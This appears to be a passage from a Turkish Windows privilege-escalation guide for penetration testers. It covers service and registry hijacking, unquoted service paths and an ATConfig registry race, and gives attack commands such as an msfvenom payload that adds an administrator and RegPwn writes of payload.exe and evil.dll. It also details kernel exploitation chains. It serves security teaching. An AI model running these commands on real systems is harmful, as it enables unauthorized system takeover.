3. Hizmet ikili dosyasını bir payload veya geçerli bir kötü amaçlı hizmet ikili dosyasıyla değiştirin.
4. `sc stop <service_name> && sc start <service_name>` ile hizmeti yeniden başlatın (veya yeniden başlatmayı / hizmet tetikleyicisini bekleyin).

Yararlı otomatik kontroller:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Hizmet normal bir kullanıcının onu yeniden başlatmasına izin vermiyorsa, açılışta otomatik olarak başlayıp başlamadığını, yeniden başlatan bir hata eylemi olup olmadığını veya onu kullanan uygulama tarafından dolaylı olarak tetiklenip tetiklenemediğini kontrol edin.

### Hizmet registry’sini değiştirme izinleri

Herhangi bir hizmet registry’sini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir hizmet **registry**’si üzerindeki **izinlerinizi** şu şekilde **kontrol** edebilirsiniz:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Belirli bir hizmet anahtarında **Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** için yazma yetkisi veren kayıt defteri izinleri olup olmadığını inceleyin. Tek başına bir ACL girdisi, etkin erişimi kanıtlamaz: deny girdileri, geçerli token ve devralınan izinler önemlidir. Kayıt defteri anahtarı hakları, hizmet nesnesinin `SERVICE_CHANGE_CONFIG` ve `SERVICE_START` haklarından ayrıdır. Yetki yükseltme için ayrıca kullanılabilir bir hizmet yapılandırma alanı, hizmeti tetiklemenin bir yolu ve daha ayrıcalıklı bir hizmet kimliği gerekir. Microsoft'un [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) ve [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) sayfalarına bakın.

Yürütülen binary'nin Path'ini değiştirmek için:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race ile keyfi HKLM değer yazımı (ATConfig)

Bazı Windows Accessibility özellikleri, kullanıcı başına **ATConfig** anahtarları oluşturur; bu anahtarlar daha sonra bir **SYSTEM** işlemi tarafından HKLM oturum anahtarına kopyalanır. Bir registry **symbolic link race**, bu ayrıcalıklı yazma işlemini **herhangi bir HKLM yoluna** yönlendirerek keyfi HKLM **değer yazma** primitive'i sağlar.<sup>[[18]](#references)</sup>

Anahtar konumları (örnek: Ekran Klavyesi `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`, yüklü accessibility özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`, kullanıcı denetimindeki yapılandırmayı saklar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`, oturum açma/secure-desktop geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Abuse akışı (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz **HKCU ATConfig** değerini ayarlayın.
2. Secure-desktop kopyalama işlemini tetikleyin (ör. **LockWorkstation**); bu, AT broker akışını başlatır.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerine bir **oplock** koyarak **race'i kazanın**; oplock tetiklendiğinde **HKLM Session ATConfig** anahtarını korumalı bir HKLM hedefini gösteren bir **registry link** ile değiştirin.
4. SYSTEM, saldırganın seçtiği değeri yönlendirilen HKLM yoluna yazar.

Keyfi HKLM değer yazma elde ettikten sonra, service yapılandırma değerlerini üzerine yazarak LPE'ye geçin:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komut satırı)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabileceği bir service seçin (ör. **`msiserver`**) ve yazma işleminin ardından tetikleyin. **Not:** Public exploit implementasyonu, race'in bir parçası olarak workstation'ı kilitler.

Örnek araçlar (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services kayıt defterinde AppendData/AddSubdirectory izinleri

Bir kayıt defteri üzerinde bu izne sahipseniz, **buradan alt kayıt defterleri oluşturabilirsiniz**. Windows services söz konusu olduğunda bu, **keyfi kod yürütmek için yeterlidir:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Çalıştırılabilir dosyanın yolu tırnak işaretleri içine alınmamışsa Windows, boşluklara kadar olan her bölümü çalıştırmayı dener.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları çalıştırmayı dener:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak içine alınmamış tüm hizmet yollarını listeleyin:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Bu güvenlik açığını metasploit ile tespit edip exploit edebilirsiniz:** `exploit/windows/local/trusted\_service\_path` Metasploit ile manuel olarak bir servis binary'si oluşturabilirsiniz:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Kurtarma Eylemleri

Windows, kullanıcıların bir hizmet başarısız olduğunda gerçekleştirilecek eylemleri belirtmesine olanak tanır. Bu özellik bir binary'yi işaret edecek şekilde yapılandırılabilir. Bu binary değiştirilebiliyorsa privilege escalation mümkün olabilir. Daha fazla bilgi için [resmî belgelere](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bakın.

## Zamanlanmış görev betiği hedefleri

`.bat` veya `.cmd` dosyasıyla `cmd.exe /c` çalıştıran etkin bir görev için, `cmd.exe`'nin yanı sıra **eylem bağımsız değişkenlerinde** belirtilen betiği de kontrol edin. Aynı durum PowerShell `-File` gibi, yorumlayıcının açık dosya bağımsız değişkeni için de geçerlidir. Zamanlanmış bir batch dosyası doğrudan bir PowerShell `-File` çağrısı içeriyorsa, başvurulan betiğin ACL'sini de inceleyin; değişkenler, koşullu ifadeler ve shell zincirleme işlemleri elle izlenmelidir. Çağıran hesabın yazabildiği bir betik veya üst dizin, yalnızca yapılandırılmış görev sorumlusu çağırandan farklıysa ve görev gerçekten o eyleme ulaşıyorsa hesaplar arası yürütme olasılığına işaret eder. Betikler için yalnızca sona ekleme izni veren bir ACL önemli olabilir; ancak daha önceki bir `exit` veya başka bir kontrol akışı, eklenen satırların erişilemez olmasına yol açabilir. Privilege escalation olduğunu öne sürmeden önce etkin ACL'leri, [görev yürütme bağlamını](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), çalışma dizinini, tetikleyiciyi ve uygulama denetimi politikasını doğrulayın. Envanter çıkarma işlemi betiği değiştirmemeli veya görevi başlatmamalıdır.

## Erişilebilir dosyalardaki adlandırılmış akışlar

NTFS'de okunabilir bir dosyanın, normal bir dizin listelemesinde görünmeyen içeriğe sahip adlandırılmış bir `:$DATA` akışı olabilir. Erişilebilir yedek veya yapılandırma dosyalarından küçük ve ilgili bir küme için, içeriği açmadan önce akış **adlarını ve boyutlarını** inceleyin; Windows bunları [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) üzerinden, PowerShell ise [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) üzerinden sunar. Bir sırrı çağrıştıran akış adı yalnızca bir ipucudur. Dosyanın etkin okuma erişimini, dosya sisteminin akış desteğini, akışın kullanılabilir kimlik bilgileri içerip içermediğini ve bu kimlik bilgilerinin gerçekte hangi hesapla kimlik doğruladığını kontrol edin. Rutin envanter çıkarma sırasında özyinelemeli akış taramalarından ve akış içeriklerini yazdırmaktan kaçının.

## Zamanlanmış Windows Driver Kit yardımcı programı girdileri

İsteğe bağlı Windows Driver Kit, çalıştırıldığı dizindeki `command.txt`, `reboot.rsf` ve projeye ait `working\rsf.rsf` dosyasını kullanabilen `StandaloneRunner.exe` içerir. Ayrıcalıklı bir hesapla bu yardımcı programı başlatan zamanlanmış bir görev veya hizmet, yardımcı programın yürütülebilir dosyası korumalı olsa bile, bu girdilere düşük ayrıcalıklı yazma erişimini söz konusu hesabın bağlamında komut yürütmeye dönüştürebilir. Ayrıcalıklı tüketiciyi ve her **iki** yardımcı dosyanın da oluşturulabildiğini veya değiştirilebildiğini doğrulayın; yalnızca yardımcı programı bulmak yeterli değildir.

Zamanlanmış bir görev için, görevin eylemindeki [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) değerini ve iki yardımcı dosya yolunun ACL'lerini inceleyin. Görev bir çalışma dizini belirtmiyorsa, yürütülebilir dosyanın dizini yalnızca doğrulanması gereken bir ipucudur; görevin girdilerini nereden okuduğunun kanıtı değildir. Projenin çalışma dosyasına ilişkin ön koşul da karşılanmalıdır. Görevin SYSTEM olarak çalıştığını varsaymak yerine gerçek görev sorumlusunu kontrol edin.

## Uygulamalar

### Yüklü Uygulamalar

**Binary'lerin izinlerini** (belki birinin üzerine yazıp privilege escalation sağlayabilirsiniz) ve **klasörlerin** izinlerini kontrol edin ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent onarım yolu

[CVE-2024-0670](https://checkmk.com/werk/16361), komut dosyalarını `C:\Windows\Temp` konumuna yazan ve değiştirme başarısız olduğunda önceden var olan, yazmaya karşı korumalı bir dosyayı çalıştıran eski Checkmk Windows agent sürümlerini etkiler. Üretici sorunu 2.1.0p40, 2.2.0p23, 2.3.0b1 ve 2.4.0b1 sürümlerinde düzeltti. Kurulu tam patch seviyesini ve etkilenen agent işleminin çalışıp çalışamayacağını kontrol edin; `2.1` gibi yalnızca dalı belirten bir etiket, sistemin etkilenip etkilenmediğini ortaya koyamaz. Envanter çıkarma işlemi, dosya oluşturmadan veya agent komutlarını tetiklemeden sürümü, hizmet durumunu ve Temp izinlerini inceleyebilir.

#### ADSelfService Plus SAML hizmeti incelemesi

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html), 6210 ve önceki ADSelfService Plus build'lerini etkiledi; üretici sorunu 6211 build'inde düzeltti. Bu sorun yalnızca SAML SSO **etkinse veya geçmişte etkin olmuşsa** önem taşır. Bu nedenle kurulu ürün kaydı veya hizmet yolu, bir zafiyet tespiti değil, yalnızca bir ipucudur: tam build'i, SAML yapılandırma geçmişini, hizmete ağ üzerinden erişilip erişilemediğini ve hizmetin hangi hesapla çalıştığını doğrulayın. Hizmet üzerinden code execution, o hesabın ayrıcalıklarını devralır; SYSTEM olarak çalıştırma için örneğin SYSTEM hesabıyla çalışıyor olması gerekir. Ürünün Backup dizininde okunabilir bir `OfflineBackup_*.ezip`, ayrı ve şifrelenmiş bir yedek ipucudur; kullanılabilir bir kimlik bilgisinin veya bu SAML açığının kanıtı değildir. Rutin envanter çıkarma sırasında dosyayı açmadan yolunu ve erişim haklarını kaydedin.

#### Jenkins controller ve domain hesabı sınırları

Windows Jenkins controller'ında iş oluşturma veya yapılandırma iznini işi başlatma izninden ayırın: [Jenkins bunları ayrı `Job/Create`, `Job/Configure` ve `Job/Build` hakları olarak belgeliyor](https://www.jenkins.io/doc/book/security/access-control/permissions/). Yapılandırılmış bir zamanlama veya uzak tetikleyici başka bir build yolu sağlayabilir, ancak etkin olduğunu ve build'in gerçekten çalıştığını doğrulayın. Çalıştırma, controller'ın veya seçilen agent'ın kimliğiyle gerçekleşir; kayıtlı bir kimlik bilgisi yalnızca işin erişebildiği kapsamda kullanılabilir. Ayrıca `JENKINS_HOME` metadata'sına erişimi inceleyin: Jenkins, kimlik bilgisi materyalini ve şifreleme anahtarlarını `credentials.xml`, `secrets/hudson.util.Secret` ve `secrets/master.key` dosyalarında tutar ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Bu dosyaların varlığı tek başına bir parolayı açığa çıkarmaz; **gerekli dosyalara okuma erişimini** ve ayrı bir hesap yeniden kullanım yolunu, paylaşılan çıktılara sırları yazdırmadan doğrulayın. Bu hesabın AD kullanıcı nesnesinde `scriptPath` yazma hakkı varsa, kullanıcılar arası çalıştırma olarak değerlendirmeden önce yazılabilir bir script yolu ve hedef kullanıcı olarak çalışan gerçek bir logon veya zamanlanmış tüketici olduğunu doğrulayın. Ek grup denetimi için etkin AD haklarının ayrıca doğrulanması gerekir.

#### Azure Pipelines self-hosted agent kimliği

Bir Azure DevOps Server veya Azure Pipelines projesinde, pipeline **oluşturma veya düzenleme** iznini pipeline'ı **queue etme** ve seçilen agent pool'u kullanma izninden ayırın; [Microsoft pipeline izinlerini](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) ve [pool yetkilendirmesini](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) ayrı ayrı belgeliyor. Daha düşük ayrıcalıklı bir hesap script adımı gönderebiliyor ve bu pipeline'ı self-hosted Windows agent üzerinde çalıştırabiliyorsa, adım [agent'ın yapılandırılmış işletim sistemi hesabıyla](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) çalışır. Kullanıcılar arası veya SYSTEM geçişi olduğunu öne sürmeden önce tam pipeline'ı, branch/resource kısıtlamalarını, yetkilendirilmiş pool'u, çalıştırılabilir işi ve agent hizmet kimliğini doğrulayın. Kurulu bir agent, proje rolü veya repository yazma izni tek başına yalnızca bir ipucudur; pasif envanter çıkarma sırasında build başlatmadan izinleri ve yerel hizmet metadata'sını inceleyin.

#### Microsoft Entra Connect Sync kimlik bilgileri

[Microsoft](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions), eşitleme hizmetini çalıştıran ve SQL veritabanına erişen **ADSync hizmet hesabı** ile dizin izinleri yapılandırılmış eşitleme özelliklerine bağlı olan **AD DS connector hesabını** birbirinden ayırır. Connector kimlik bilgileri bu veritabanında şifrelenmiş olarak saklanır; anahtar materyali [ADSync hizmet hesabı altında DPAPI ile korunur](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Kurulu bir eşitleme hizmeti, yerel yönetici izlenimi veren bir grup veya veritabanının görünür olması tek başına çözülebilir bir kimlik bilgisini ya da domain ayrıcalık yükseltmesini kanıtlamaz. Gerçek veritabanı okuma haklarını, hizmet hesabı/anahtar erişimini, kurulum ve SQL düzenini, yapılandırılmış connector kimliğini ve bu kimliğin etkin AD ayrıcalıklarını ayrı ayrı inceleyin. Rutin envanter çıkarma yalnızca hizmet ve erişim metadata'sını göstermeli; kayıtlı sırları sorgulamamalı veya yazdırmamalıdır.

#### Printer driver support DLL izinleri

Kurulu bir printer driver, support DLL'lerini `C:\ProgramData` altında tutabilir ve bunları daha ayrıcalıklı bir print process içinde yükleyebilir. Printer WMI envanterine erişim engellense bile üst dizinler ve reparse point'ler dahil olmak üzere tam driver dizininin ve DLL ACL'lerinin izinlerini inceleyin. [Ricoh printer-driver sorunu CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) için bildirilen yol `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` idi; [orijinal açıklama](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) DLL'lerin `PrintIsolationHost.exe` tarafından yüklendiğini belirtiyor. Yazılabilir bir ACL yalnızca bir ipucudur: deny girdileri dikkate alındıktan sonra etkin yazma erişiminin bulunup bulunmadığını, ilgili driver'ın kurulu olup olmadığını ve dosyayı ayrıcalıklı bir kimlikle yükleyip yüklemediğini, ayrıca üreticinin güncel driver'ının veya güvenlik programının kurulumdaki sorunu giderip gidermediğini doğrulayın. Yalnızca dizin adına veya driver sürümüne bakarak zafiyet olduğu sonucuna varmayın.

### Yazma İzinleri

Bazı özel dosyaları okumak için bir config dosyasını değiştirebiliyor musunuz ya da bir Administrator hesabıyla çalıştırılacak bir binary'yi değiştirebiliyor musunuz kontrol edin (schedtasks).

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şunu yapmaktır:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ `plugins` alt klasörlerindeki tüm plugin DLL'lerini otomatik yükler. Yazılabilir bir portable/kopya kurulum varsa, kötü amaçlı bir plugin bırakmak her başlatmada `notepad++.exe` içinde otomatik kod yürütülmesini sağlar (`DllMain` ve plugin callback'leri dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştır

**Başka bir kullanıcı tarafından çalıştırılacak bir kayıt defteri girdisinin veya ikili dosyanın üzerine yazıp yazamayacağınızı kontrol edin.**\
**Yetki yükseltmek için ilgi çekici autoruns konumları** hakkında daha fazla bilgi edinmek için **aşağıdaki sayfayı** okuyun:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **üçüncü taraf şüpheli/güvenlik açığı olan** sürücüleri arayın

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Bir driver keyfi bir kernel read/write primitive’i sunuyorsa (kötü tasarlanmış IOCTL handler’larında sık görülür), kernel belleğinden doğrudan bir SYSTEM token’ı çalarak yetki yükseltebilirsiniz.<sup>[[13]](#references)</sup> Adım adım tekniği burada görebilirsiniz:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Savunmasız çağrının saldırganın kontrolündeki bir Object Manager yolunu açtığı race-condition bug’larında, aramayı kasıtlı olarak yavaşlatmak (maksimum uzunlukta bileşenler veya derin dizin zincirleri kullanarak) pencereyi mikrosaniyelerden onlarca mikrosaniyeye kadar genişletebilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAF’leri, paged-pool sızıntıları ve I/O ring geçişleri

Bazı Windows kernel LPE zincirleri, tek başlarına zayıf olan iki bug’dan oluşturulabilir: kuyruk kilidi hâlâ tutulurken bir isteği/CBD’yi serbest bırakan **cancel-safe queue yaşam süresi yarış durumu** ve `RtlCopyToUser` sırasında serbest bırakılmış bir paged-pool tahsisini sızdıran **kopyalama öncesinde kilidi bırakma** açığı.<sup>[[29]](#references)</sup>

Denetim ve exploitation notları:

- **Kilit altındayken serbest bırakma + ardından iptal**: başarı yolunun **Acquire -> CompleteRequest/free -> Release**, iptal yolunun ise **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** yaptığı bir akış arayın. Başarı yolu, CBDQ/CSQ kilidini bırakmadan önce `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` çağrısına ulaşırsa, `NtCancelIoFileEx -> IopCsqCancelRoutine` içinde bloklanan bir thread daha sonra devam edip serbest bırakılmış bir `PFLT_CALLBACK_DATA` değerini driver’ın remove callback’ine geçirebilir.
- Serbest bırakılmış kuyruk nesnesini aynı boyutta, saldırganın kontrolündeki bir paged-pool tahsisiyle **yeniden tahsis edin**. `NPFS` Data Queue Entries kullanışlıdır; çünkü payload ve boyut kontrol edilebilir, ayrıca daha sonra pipe read/peek işlemleriyle incelenebilir. Serbest bırakılan nesne list link’leri içeriyorsa bunları, user memory’deki sahte request node’larından oluşan **döngüsel bir listeyle** üzerine yazın. Böylece driver, özgün liste başında durmak yerine saldırganın tanımladığı request yapıları üzerinde tekrar tekrar işlem yapar.
- **Öngörülebilir bir yazmayı geliştirin**: Sahte request, bookkeeping yazmalarında (timestamp / QPC / refcount’a bitişik alanlar) kullanılan iç içe bir context pointer’ını başka yere yönlendiriyorsa, **adresi kontrol edilebilen ancak değeri kontrol edilemeyen** bir kernel write elde edebilirsiniz. Bu durumda, son bir code/data pointer’ı yerine sprayed pool nesnesinin **length/size** alanını hedefleyin; ardından bozulmuş nesne out-of-bounds paged-pool read sağlayana kadar spray’i tarayın.
- **Yarış koşuluna açık disclosure modeli**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` yapan her syscall güçlü bir adaydır. Saldırgan kopyalanan buffer’ı büyütebiliyorsa (örneğin serializer’ın son tahsis boyutunu artıran çok sayıda list/resource girdisi ekleyerek) güvenilirlik artar; çünkü daha uzun kopyalama, makinenin çökmesine yol açmadan değiştirme penceresini genişletir.
- **Pointer açısından zengin yeniden doldurma hedefleri**: Windows **I/O ring** registered-buffer dizileri, paged-pool boyutları saldırgan tarafından kontrol edilebildiğinden (`8 * regBufferCnt`) ve her eleman bir `_IOP_MC_BUFFER_ENTRY` için kernel pointer’ı olduğundan mükemmel disclosure hedefleridir. Bu dizilerden birini sızdırın, çevresindeki `IORING_OBJECT`’i bulun, ardından sonraki I/O ring işlemlerinin saldırganın oluşturduğu girdileri kullanarak keyfi kernel read/write sağlaması için **`RegBuffers`** ve **`RegBuffersCount`** değerlerini bozun. Kullanılabilir tek yazma işlemi size sabit bir byte sağlıyorsa (örneğin `KUSER_SHARED_DATA+0x14` değerinden), `0x0101010101010101` gibi tekrarlanan byte’lardan oluşan bir user pointer oluşturmak için **örtüşen, hizalanmamış yazmalar** kullanın; bu adresi `VirtualAlloc` ile eşleyin ve sahte registered-buffer dizisini buraya yerleştirin.<sup>[[30]](#references)</sup>

Yararlı debugging göstergeleri:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Once you obtain arbitrary kernel read/write from the corrupted I/O ring, standart post-primitive workflow'u kullanarak bir SYSTEM token çalın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive açıkları, deterministik bellek düzenleri oluşturmanıza, yazılabilir HKLM/HKU alt anahtarlarını kötüye kullanmanıza ve metadata corruption'ı özel bir driver olmadan kernel paged-pool overflow'larına dönüştürmenize olanak tanır. Tüm zinciri burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Saldırgan kontrollü path'lerden kaynaklanan `RtlQueryRegistryValues` direct-mode type confusion

Bazı driver'lar userland'den bir registry path kabul eder, yalnızca bunun geçerli bir UTF-16 string olduğunu doğrular ve ardından `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını `int readValue` gibi bir stack scalar'a `RTL_QUERY_REGISTRY_DIRECT` kullanarak yapar. `RTL_QUERY_REGISTRY_TYPECHECK` yoksa `EntryContext`, geliştiricinin beklediği türe göre değil, registry'deki **gerçek** türe göre yorumlanır.

Bu, iki kullanışlı primitive oluşturur:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Kullanıcı kontrollü mutlak bir `\Registry\...` path'i, driver'ın saldırganın seçtiği anahtarları sorgulamasına, dönüş kodları/log'lar üzerinden varlık bilgisini sızdırmasına ve bazen çağıranın doğrudan erişemediği değerleri okumasına olanak tanır.
- **Kernel memory corruption**: `&readValue` gibi bir scalar hedef, registry value türüne bağlı olarak `REG_QWORD`, `UNICODE_STRING` veya boyutlandırılmış bir binary buffer olarak type confusion'a uğrar.

Pratik exploitation notları:

- **Windows 8+ mitigation**: Sorgu, `RTL_QUERY_REGISTRY_TYPECHECK` olmadan `RTL_QUERY_REGISTRY_DIRECT` kullanarak bir **untrusted hive**'a ulaşırsa kernel çağıranlar `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ile çöker. Exploit edilebilirliği korumak için `HKCU` altında değerler hazırlamak yerine **trusted system hive'lar içindeki saldırganın yazabildiği anahtarları** arayın.
- **Trusted-hive staging**: `\Registry\Machine` altındaki yazılabilir alt anahtarları listelemek için NtObjectManager kullanın ve sandbox'lı context'lerden erişilebilen anahtarları bulmak için taramayı kopyalanmış bir **low-integrity** token ile tekrarlayın:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byte `int` içine yapılan 8-byte doğrudan yazma, bitişik stack verilerini bozar ve yakındaki bir callback/function pointer’ı kısmen üzerine yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: Direct mode, `EntryContext`’in bir `UNICODE_STRING`’i göstermesini bekler. Kod önce saldırgan denetimindeki bir `REG_DWORD` değerini stack scalar’a yükler, ardından aynı buffer’ı string okuması için yeniden kullanırsa saldırgan `Length`/`MaximumLength` değerlerini denetler ve `Buffer` pointer’ını kısmen etkiler; böylece kısmen denetlenebilir bir kernel write elde eder.
- **`REG_BINARY`**: Büyük binary veriler için direct mode, `EntryContext`’teki ilk `LONG` değerini işaretli bir buffer boyutu olarak ele alır. Önceki bir `REG_DWORD` okuması, yeniden kullanılan scalar’da saldırgan denetimindeki **negatif** bir değer bırakırsa sonraki `REG_BINARY` sorgusu saldırganın byte’larını doğrudan bitişik stack slot’larının üzerine kopyalar. Bu, çoğu zaman callback pointer’ının tamamını üzerine yazmanın en temiz yoludur.

Güçlü bir hunting pattern: **aynı stack variable içine yeniden başlatılmadan yapılan farklı türlerde registry okumaları**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT` ve yeniden kullanılan `EntryContext` pointer’ları için grep yapın; ayrıca ilk registry okumasının ikinci okumanın gerçekleşip gerçekleşmeyeceğini denetlediği kod yollarını arayın.

#### Device object’lerde FILE_DEVICE_SECURE_OPEN ayarının eksikliğini kötüye kullanma (LPE + EDR kill)

Bazı imzalı üçüncü taraf driver’lar, IoCreateDeviceSecure ile güçlü bir SDDL kullanarak device object’lerini oluşturur ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN ayarını yapmayı unutur. Bu flag olmadığında, device ek bir bileşen içeren bir path üzerinden açıldığında güvenli DACL uygulanmaz; böylece ayrıcalıksız herhangi bir kullanıcı şu tür bir namespace path kullanarak handle elde edebilir:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek bir vakadan)

Kullanıcı device’ı açabildiğinde, driver’ın sunduğu ayrıcalıklı IOCTL’ler LPE ve tampering için kötüye kullanılabilir. Gerçek dünyada gözlemlenen örnek yetenekler:
- İstenilen process’lere full-access handle döndürme (token theft / DuplicateTokenEx/CreateProcessAsUser üzerinden SYSTEM shell).
- Kısıtlamasız raw disk okuma/yazma (offline tampering, boot-time persistence hileleri).
